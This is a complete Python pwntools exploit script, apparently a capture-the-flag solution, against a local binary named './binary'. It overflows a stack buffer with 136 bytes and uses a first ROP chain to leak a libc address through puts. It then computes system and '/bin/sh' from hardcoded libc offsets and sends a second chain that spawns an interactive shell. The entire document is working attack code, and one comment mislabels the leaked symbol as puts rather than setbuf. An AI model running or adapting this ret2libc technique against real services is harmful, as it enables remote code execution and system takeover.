

from pwn import *

proc = process("./binary") #local

offset = 136
overflow = b"A"*offset

pop_rdi = 0x400913
setbuf_at_got = 0x601028
puts_at_plt = 0x400540
main = 0x400771

# ROP chain to leak puts address
# p64 -> packing in x64 format
payload = [
    overflow,
    p64(pop_rdi),
    p64(setbuf_at_got),
    p64(puts_at_plt),
    p64(main),
]

payload = b"".join(payload)
proc.sendline(payload)

proc.recvline()
proc.recvline()
leak = u64(proc.recvline().strip().ljust(8, b"\x00")) # Leaking the puts address | u64 -> unpacking in x64 format
log.info(f"{hex(leak)=}")

setbuf_offset = 0x88540
base_libc = leak - setbuf_offset

system_offset = 0x4f4e0
system_address = base_libc + system_offset

bin_sh_offset = 0x1b40fa
bin_sh = base_libc + bin_sh_offset

ret = 0x40052e

# Second ROP chain to get shell
payload_two = [
    overflow,
    p64(pop_rdi),
    p64(bin_sh),
    p64(ret), # stack allignment -> 00
    p64(system_address),
]

payload_two = b"".join(payload_two)
proc.sendline(payload_two)

proc.interactive()





